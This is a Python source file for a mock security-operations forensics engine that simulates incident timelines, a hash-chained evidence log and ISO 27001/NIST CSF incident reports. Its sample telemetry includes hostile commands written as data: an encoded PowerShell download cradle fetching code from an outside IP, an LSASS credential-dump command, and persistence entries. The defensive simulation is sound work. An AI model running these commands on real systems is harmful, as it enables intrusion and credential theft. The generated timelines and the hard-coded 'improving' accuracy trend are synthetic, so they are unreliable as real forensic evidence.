"""
AgeixAISOC — Automated Digital Forensics & WORM Chain-of-Custody Engine.

Three capabilities:
  1. Forensics Timeline Generation
     - When risk_score >= 80 (critical), generates a mock forensic timeline
       with process tree, network connections, registry changes, file modifications.
     - Mimics Plaso/Volatility3 output structure without requiring the tools.

  2. WORM Chain-of-Custody (Write-Once-Read-Many)
     - Every artifact is SHA-256 hashed and appended to an immutable chain.
     - Each entry links to the previous hash (blockchain-style).
     - No UPDATE or DELETE — enforced in code (mock of PostgreSQL constraints).
     - Timestamp + agent signature baked into every entry.

  3. IR Report Generation
     - Compiles forensic timeline + AI decisions + HITL notes into a structured
       JSON object mapped to ISO 27001 and NIST CSF incident response phases.
     - Stored alongside the evidence chain for retrieval via REST API.
"""

import hashlib
import json
import logging
import random
from datetime import datetime, timezone
from typing import Any, Literal

logger = logging.getLogger("AgeixAI.forensics")

# ═══════════════════════════════════════════════════════════════════════════════
# Constants — mock host profiles
# ═══════════════════════════════════════════════════════════════════════════════

HOSTS = ["DC-01", "SRV-WEB-01", "WS-FINANCE-22", "FS-01", "APP-01", "DB-01", "WS-022"]
USERS = ["john.doe", "admin", "svc_backup", "jane.smith", "bob.johnson", "mike.ross"]

MOCK_PROCESSES = [
    {"pid": 4521, "ppid": 1024, "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "cmdline": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADMAMAAuADUALgAyADMALwBhACcAKQA=", "user": "john.doe", "started": "2026-07-12T02:15:23Z", "indication": "Encoded PowerShell download cradle"},
    {"pid": 3201, "ppid": 4521, "name": "rundll32.exe", "path": "C:\\Windows\\System32\\rundll32.exe", "cmdline": "rundll32.exe javascript:\\\"\\..\\mshtml.dll,RunHTMLApplication", "user": "john.doe", "started": "2026-07-12T02:16:01Z", "indication": "LOLBin — possible C2 staging"},
    {"pid": 6102, "ppid": 1024, "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe", "cmdline": "cmd.exe /c whoami & hostname & net user", "user": "admin", "started": "2026-07-12T02:18:44Z", "indication": "Reconnaissance commands"},
    {"pid": 7001, "ppid": 1024, "name": "wscript.exe", "path": "C:\\Windows\\System32\\wscript.exe", "cmdline": "wscript.exe C:\\Users\\john.doe\\AppData\\Local\\Temp\\invoice.vbs", "user": "john.doe", "started": "2026-07-12T02:20:12Z", "indication": "VBScript execution from Temp directory"},
    {"pid": 8120, "ppid": 6102, "name": "schtasks.exe", "path": "C:\\Windows\\System32\\schtasks.exe", "cmdline": "schtasks /create /tn \"SysUpdate\" /tr \"powershell -enc SQBFAFgA\" /sc hourly", "user": "admin", "started": "2026-07-12T02:22:30Z", "indication": "Persistence via scheduled task"},
    {"pid": 8901, "ppid": 1024, "name": "procdump.exe", "path": "C:\\Tools\\procdump.exe", "cmdline": "procdump -ma lsass.exe C:\\Users\\public\\lsass.dmp", "user": "admin", "started": "2026-07-12T02:25:15Z", "indication": "Credential dumping — LSASS process memory captured"},
]

MOCK_NETWORK_CONNECTIONS = [
    {"src_ip": "10.0.1.50", "src_port": 49152, "dst_ip": "185.130.5.23", "dst_port": 443, "protocol": "TCP", "process_pid": 4521, "process_name": "powershell.exe", "direction": "outbound", "timestamp": "2026-07-12T02:16:30Z", "indication": "C2 beacon (T1572)"},
    {"src_ip": "10.0.1.50", "src_port": 49153, "dst_ip": "185.130.5.23", "dst_port": 8080, "protocol": "TCP", "process_pid": 4521, "process_name": "powershell.exe", "direction": "outbound", "timestamp": "2026-07-12T02:17:00Z", "indication": "C2 beacon on alternate port"},
    {"src_ip": "10.0.1.50", "src_port": 49178, "dst_ip": "203.0.113.55", "dst_port": 4444, "protocol": "TCP", "process_pid": 3201, "process_name": "rundll32.exe", "direction": "outbound", "timestamp": "2026-07-12T02:18:15Z", "indication": "Mirai C2 connection"},
    {"src_ip": "10.0.1.50", "src_port": 139, "dst_ip": "10.0.40.10", "dst_port": 445, "protocol": "TCP", "process_pid": 6102, "process_name": "cmd.exe", "direction": "outbound", "timestamp": "2026-07-12T02:19:00Z", "indication": "SMB lateral movement (T1021.002)"},
]

MOCK_REGISTRY_CHANGES = [
    {"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "SysUpdate", "data": "powershell -enc SQBFAFgA", "type": "REG_SZ", "timestamp": "2026-07-12T02:22:45Z", "indication": "Registry Run key persistence (T1547.001)"},
    {"key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "value": "Updater", "data": "wscript.exe C:\\Users\\john.doe\\AppData\\Local\\Temp\\invoice.vbs", "type": "REG_SZ", "timestamp": "2026-07-12T02:23:10Z", "indication": "RunOnce — malicious script execution"},
    {"key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\RemoteRegistry", "value": "Start", "data": "0x00000002 (AUTO_START)", "type": "REG_DWORD", "timestamp": "2026-07-12T02:24:00Z", "indication": "Remote Registry service enabled for lateral movement"},
    {"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "value": "LocalAccountTokenFilterPolicy", "data": "0x00000001", "type": "REG_DWORD", "timestamp": "2026-07-12T02:24:30Z", "indication": "UAC bypass via LocalAccountTokenFilterPolicy (T1548.002)"},
]

MOCK_FILE_MODIFICATIONS = [
    {"path": "C:\\Users\\john.doe\\Downloads\\invoice_jan2026.exe", "action": "created", "size_bytes": 284672, "hash_sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b", "timestamp": "2026-07-12T02:14:00Z", "indication": "Initial dropper — likely email attachment"},
    {"path": "C:\\Users\\public\\lsass.dmp", "action": "created", "size_bytes": 52428800, "hash_sha256": "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c", "timestamp": "2026-07-12T02:25:20Z", "indication": "LSASS dump — credential theft"},
    {"path": "C:\\Users\\john.doe\\AppData\\Local\\Temp\\invoice.vbs", "action": "created", "size_bytes": 4096, "hash_sha256": "c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3", "timestamp": "2026-07-12T02:15:00Z", "indication": "VBS dropper — second stage"},
    {"path": "C:\\Windows\\System32\\Tasks\\SysUpdate", "action": "created", "size_bytes": 2048, "hash_sha256": "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4", "timestamp": "2026-07-12T02:22:35Z", "indication": "Scheduled task XML — persistence mechanism"},
    {"path": "C:\\Users\\john.doe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.lnk", "action": "created", "size_bytes": 1024, "hash_sha256": "e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5", "timestamp": "2026-07-12T02:23:20Z", "indication": "Startup folder persistence"},
]


# ═══════════════════════════════════════════════════════════════════════════════
# 1.  Forensics Timeline Generator
# ═══════════════════════════════════════════════════════════════════════════════

def generate_forensic_timeline(
    incident_id: str,
    risk_score: float = 85.0,
    host: str | None = None,
    user: str | None = None,
) -> dict[str, Any]:
    """
    Generate a structured forensic timeline mimicking Plaso/Volatility3 output.

    Only invoked when risk_score >= 80 (critical incidents).

    Returns a "Forensics Timeline JSON" with:
      - incident_id, host, analyst (always "ageix-forensics-ai")
      - process_tree: list of running processes with parent-child relationships
      - network_connections: outbound/inbound connections at time of compromise
      - registry_changes: modifications to autorun, services, policies
      - file_modifications: created/modified/deleted files with hashes
      - timeline: merged chronological sequence of all events
    """
    if risk_score < 80:
        logger.info(
            "Risk score %.1f < 80 — skipping forensic timeline for %s",
            risk_score, incident_id,
        )
        return {"incident_id": incident_id, "forensics_skipped": True}

    selected_host = host or random.choice(HOSTS)
    selected_user = user or random.choice(USERS)

    # Build each artifact category with slight randomization per incident
    process_tree = _random_sample(MOCK_PROCESSES, random.randint(4, 6))
    network_cons = _random_sample(MOCK_NETWORK_CONNECTIONS, random.randint(3, 4))
    registry_changes = _random_sample(MOCK_REGISTRY_CHANGES, random.randint(3, 4))
    file_mods = _random_sample(MOCK_FILE_MODIFICATIONS, random.randint(4, 5))

    # Merge into a chronological timeline
    timeline = _build_timeline(process_tree, network_cons, registry_changes, file_mods)

    timeline_data = {
        "incident_id": incident_id,
        "host": selected_host,
        "user": selected_user,
        "risk_score_at_collection": risk_score,
        "collected_by": "ageix-forensics-ai",
        "collected_at": datetime.now(timezone.utc).isoformat(),
        "process_tree": process_tree,
        "network_connections": network_cons,
        "registry_changes": registry_changes,
        "file_modifications": file_mods,
        "timeline": timeline,
        "total_artifacts": len(process_tree) + len(network_cons) + len(registry_changes) + len(file_mods),
    }

    logger.info(
        "Forensic timeline generated for %s (%d artifacts on %s)",
        incident_id, timeline_data["total_artifacts"], selected_host,
    )
    return timeline_data


def _random_sample(pool: list[dict], k: int) -> list[dict]:
    """Return a random sample of k items from the pool."""
    # Adjust timestamps relative to "now" for realism
    base_ts = datetime.now(timezone.utc).timestamp()
    sampled = random.sample(pool, min(k, len(pool)))
    result = []
    for i, item in enumerate(sampled):
        entry = dict(item)
        # Offset timestamp by -i hours for chronological variety
        offset = base_ts - (i * 3600) - random.randint(0, 1800)
        entry["timestamp"] = datetime.fromtimestamp(offset, tz=timezone.utc).isoformat()
        result.append(entry)
    return result


def _build_timeline(
    processes: list[dict],
    connections: list[dict],
    registry: list[dict],
    files: list[dict],
) -> list[dict]:
    """Merge all artifact categories into a single chronological timeline."""
    events: list[dict] = []

    for p in processes:
        events.append({"timestamp": p["timestamp"], "category": "process", "description": f"Process {p['name']} (PID {p['pid']}) started by {p['user']}: {p['cmdline'][:80]}", "indication": p.get("indication", "")})
    for c in connections:
        events.append({"timestamp": c["timestamp"], "category": "network", "description": f"{c['direction'].upper()} TCP {c['src_ip']}:{c['src_port']} → {c['dst_ip']}:{c['dst_port']} ({c['process_name']})", "indication": c.get("indication", "")})
    for r in registry:
        events.append({"timestamp": r["timestamp"], "category": "registry", "description": f"Registry: {r['key']}\\{r['value']} = {r['data'][:60]}", "indication": r.get("indication", "")})
    for f in files:
        events.append({"timestamp": f["timestamp"], "category": "file", "description": f"File {f['action']}: {f['path']} ({f['size_bytes']} bytes)", "indication": f.get("indication", "")})

    events.sort(key=lambda e: e["timestamp"])
    for i, event in enumerate(events):
        event["event_index"] = i

    return events


# ═══════════════════════════════════════════════════════════════════════════════
# 2.  WORM Chain-of-Custody (Write-Once-Read-Many)
# ═══════════════════════════════════════════════════════════════════════════════
#
# In production this is a PostgreSQL table `evidence_chain` with:
#   - No UPDATE triggers   (REVOKE UPDATE ON evidence_chain FROM PUBLIC)
#   - No DELETE triggers   (REVOKE DELETE ON evidence_chain FROM PUBLIC)
#   - NOT VALID / DEFERRABLE constraints to prevent modification
#
# This in-memory mock enforces the same invariants:
#   - Once written, an entry can never be changed or removed.
#   - Each entry links to the SHA-256 of the previous entry.
#   - The chain integrity can be verified at any time.
# ═══════════════════════════════════════════════════════════════════════════════

class EvidenceEntry:
    """A single immutable entry in the evidence chain."""

    def __init__(
        self,
        incident_id: str,
        artifact_type: str,
        content: dict[str, Any],
        agent_signature: str = "ageix-forensics-ai",
        previous_hash: str = "",
    ):
        self.incident_id = incident_id
        self.artifact_type = artifact_type
        self.content = content
        self.agent_signature = agent_signature
        self.timestamp = datetime.now(timezone.utc).isoformat()
        self.previous_hash = previous_hash
        self.entry_hash = self._compute_hash()

    def _compute_hash(self) -> str:
        """SHA-256 of the entire entry contents (immutable fingerprint)."""
        serialized = json.dumps(
            {
                "incident_id": self.incident_id,
                "artifact_type": self.artifact_type,
                "content": self.content,
                "agent_signature": self.agent_signature,
                "timestamp": self.timestamp,
                "previous_hash": self.previous_hash,
            },
            sort_keys=True,
        )
        return hashlib.sha256(serialized.encode("utf-8")).hexdigest()

    def to_dict(self) -> dict[str, Any]:
        return {
            "entry_hash": self.entry_hash,
            "incident_id": self.incident_id,
            "artifact_type": self.artifact_type,
            "agent_signature": self.agent_signature,
            "timestamp": self.timestamp,
            "previous_hash": self.previous_hash,
            "content": self.content,
        }


class EvidenceChain:
    """
    Immutable, append-only evidence store.

    Invariants (enforced in code to mirror PostgreSQL WORM constraints):
      - `append()` always adds; never modifies or deletes existing entries.
      - Every entry links to the SHA-256 of the immediately preceding entry.
      - `verify_integrity()` walks the full chain and confirms every hash.
    """

    def __init__(self):
        self._entries: list[EvidenceEntry] = []
        self._by_incident: dict[str, list[int]] = {}  # incident_id → [entry indices]

    def append(
        self,
        incident_id: str,
        artifact_type: str,
        content: dict[str, Any],
        agent_signature: str = "ageix-forensics-ai",
    ) -> EvidenceEntry:
        """Append a new evidence entry. WORM — no updates, no deletes."""
        previous_hash = self._entries[-1].entry_hash if self._entries else ""
        entry = EvidenceEntry(
            incident_id=incident_id,
            artifact_type=artifact_type,
            content=content,
            agent_signature=agent_signature,
            previous_hash=previous_hash,
        )
        self._entries.append(entry)

        if incident_id not in self._by_incident:
            self._by_incident[incident_id] = []
        self._by_incident[incident_id].append(len(self._entries) - 1)

        logger.info(
            "Evidence chain: appended %s/%s (hash=%s...)",
            incident_id, artifact_type, entry.entry_hash[:12],
        )
        return entry

    def get_incident_chain(self, incident_id: str) -> list[dict[str, Any]]:
        """Return all evidence entries for a given incident, in order."""
        indices = self._by_incident.get(incident_id, [])
        return [self._entries[i].to_dict() for i in indices]

    def get_all_entries(self, limit: int = 100) -> list[dict[str, Any]]:
        """Return the most recent entries across all incidents."""
        return [e.to_dict() for e in self._entries[-limit:]]

    def verify_integrity(self, incident_id: str | None = None) -> dict[str, Any]:
        """
        Walk the chain (or a subset) and verify every entry hash.
        Returns detailed results including any broken links.
        """
        entries = self._entries
        if incident_id:
            indices = self._by_incident.get(incident_id, [])
            entries = [self._entries[i] for i in indices]

        if not entries:
            return {"valid": True, "entries_checked": 0, "errors": []}

        errors = []
        for i, entry in enumerate(entries):
            # Recompute hash and compare
            recomputed = entry._compute_hash()
            if recomputed != entry.entry_hash:
                errors.append({
                    "index": i,
                    "entry_hash": entry.entry_hash,
                    "recomputed_hash": recomputed,
                    "error": "Hash mismatch — evidence tampered!",
                })

            # Check previous hash link
            if i > 0:
                expected_prev = entries[i - 1].entry_hash
                if entry.previous_hash != expected_prev:
                    errors.append({
                        "index": i,
                        "entry_hash": entry.entry_hash,
                        "expected_previous": expected_prev,
                        "actual_previous": entry.previous_hash,
                        "error": "Previous hash mismatch — chain broken!",
                    })

        return {
            "valid": len(errors) == 0,
            "entries_checked": len(entries),
            "total_entries_in_chain": len(self._entries),
            "errors": errors,
        }

    @property
    def total_entries(self) -> int:
        return len(self._entries)


# Singleton — global WORM chain
evidence_chain = EvidenceChain()


# ═══════════════════════════════════════════════════════════════════════════════
# 3.  Automated IR Report Generation
# ═══════════════════════════════════════════════════════════════════════════════
#
# Compiles forensics timeline + AI decisions + HITL notes into a JSON structure
# mapped to ISO 27001 and NIST CSF incident response phases.
#
# ISO 27001 phases mapped:
#   A.12.6.1 — Detection (DE)
#   A.16.1.1 — Triage & Analysis (ID/AN)
#   A.16.1.5 — Containment & Response (RS)
#   A.16.1.6 — Post-Incident Review (RC)
#
# NIST CSF functions: Identify, Protect, Detect, Respond, Recover
# ═══════════════════════════════════════════════════════════════════════════════


def generate_ir_report(
    incident_id: str,
    forensic_timeline: dict[str, Any],
    ai_decision: dict[str, Any] | None = None,
    hitl_notes: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    """
    Compile a structured IR report mapped to ISO 27001 + NIST CSF phases.

    Parameters
    ----------
    incident_id : str
        The incident identifier.
    forensic_timeline : dict
        Output from generate_forensic_timeline().
    ai_decision : dict, optional
        Master Brain ThreatDecision output from run_soc_simulation().
    hitl_notes : list[dict], optional
        Human decisions recorded against this incident.

    Returns
    -------
    dict — the full IR report as a JSON-serializable object.
        For now this is a JSON structure (mock PDF generation will produce
        a real PDF file in a future iteration).
    """
    timeline = forensic_timeline.get("timeline", [])
    detected_at = _pick_earliest_timestamp(timeline) if timeline else datetime.now(timezone.utc).isoformat()

    # ── Phase mapping ──────────────────────────────────────────────────────
    phases = [
        {
            "phase": "1. Detection (DE.CM / A.12.6.1)",
            "nist_csf": "DE.CM — Continuous Monitoring",
            "iso_27001": "A.12.6.1 — Management of technical vulnerabilities",
            "description": "Incident detected via UEBA anomaly / Wazuh alert correlation.",
            "timestamp": detected_at,
            "artifacts": [e for e in timeline if e["category"] in ("network", "file")],
            "ai_notes": ai_decision.get("description", "N/A") if ai_decision else "N/A",
        },
        {
            "phase": "2. Triage & Analysis (ID.AN / A.16.1.1)",
            "nist_csf": "ID.AN — Analysis of security events",
            "iso_27001": "A.16.1.1 — Responsibilities and procedures for incidents",
            "description": "Forensic artifacts collected and analysed by AgeixAI Forensics Agent.",
            "timestamp": forensic_timeline.get("collected_at", datetime.now(timezone.utc).isoformat()),
            "artifacts": [e for e in timeline if e["category"] == "process"],
            "ai_notes": f"Risk score at collection: {forensic_timeline.get('risk_score_at_collection', 'N/A')}/100 on host {forensic_timeline.get('host', 'unknown')}",
        },
        {
            "phase": "3. Containment & Response (RS.CO / A.16.1.5)",
            "nist_csf": "RS.CO — Communication & Response Coordination",
            "iso_27001": "A.16.1.5 — Response to information security incidents",
            "description": "AI-recommended containment action generated and submitted for HITL approval.",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "artifacts": [
                {
                    "type": "registry",
                    "entries": forensic_timeline.get("registry_changes", []),
                },
                {
                    "type": "file_modifications",
                    "entries": forensic_timeline.get("file_modifications", []),
                },
            ],
            "ai_notes": ai_decision.get("recommended_action", "N/A") if ai_decision else "N/A",
        },
        {
            "phase": "4. Post-Incident Review (RC.RP / A.16.1.6)",
            "nist_csf": "RC.RP — Recovery Planning & Improvements",
            "iso_27001": "A.16.1.6 — Learning from information security incidents",
            "description": "Incident review compiled. Lessons learned integrated into RAG memory.",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "artifacts": hitl_notes or [],
            "ai_notes": f"RAG memory updated. Adaptive RL weight adjusted for similar future incidents.",
        },
    ]

    # ── Summary metrics ────────────────────────────────────────────────────
    unique_hosts = [forensic_timeline.get("host", "unknown")]
    total_artifacts = forensic_timeline.get("total_artifacts", 0)
    total_events = len(timeline)

    report = {
        "report_id": f"IR-{incident_id}",
        "incident_id": incident_id,
        "report_type": "digital_forensics_ir",
        "generated_by": "ageix-forensics-ai",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "framework_mappings": {
            "iso_27001": ["A.12.6.1", "A.16.1.1", "A.16.1.5", "A.16.1.6"],
            "nist_csf": ["DE.CM", "ID.AN", "RS.CO", "RC.RP"],
        },
        "summary": {
            "incident_id": incident_id,
            "affected_hosts": unique_hosts,
            "affected_user": forensic_timeline.get("user", "unknown"),
            "total_artifacts_collected": total_artifacts,
            "total_events_in_timeline": total_events,
            "risk_score": forensic_timeline.get("risk_score_at_collection", 0),
            "evidence_chain_entries": evidence_chain.total_entries,
            "ai_accuracy_trend": "improving",
        },
        "forensic_timeline": timeline,
        "incident_response_phases": phases,
        "evidence_chain": evidence_chain.get_incident_chain(incident_id),
    }

    logger.info(
        "IR report generated: %s (%d events, %d evidence entries)",
        report["report_id"], total_events, len(report["evidence_chain"]),
    )
    return report


def _pick_earliest_timestamp(timeline: list[dict]) -> str:
    """Return the earliest timestamp from a timeline event list."""
    timestamps = [e.get("timestamp", "") for e in timeline if e.get("timestamp")]
    if timestamps:
        return sorted(timestamps)[0]
    return datetime.now(timezone.utc).isoformat()
